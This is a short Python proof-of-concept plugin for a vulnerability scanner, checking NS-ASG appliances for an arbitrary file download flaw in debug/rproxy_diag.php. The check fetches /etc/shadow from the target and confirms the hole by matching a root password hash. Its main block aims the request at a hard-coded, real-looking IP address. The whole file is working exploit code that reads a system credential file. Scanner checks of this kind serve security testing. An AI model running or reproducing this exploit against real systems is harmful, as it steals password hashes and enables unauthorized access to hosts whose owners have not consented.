#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.wooyun.org/bugs/wooyun-2014-058932

def assign(service, arg):
    if service == "NS-ASG":
        return True, arg

def audit(arg):
    url = arg + "debug/rproxy_diag.php?action=download&filename=/etc/shadow"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('root:$1$') != -1 :
        security_hole('Local File download vulnerability:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('NS-ASG', 'https://119.167.113.86:8888/')[1])
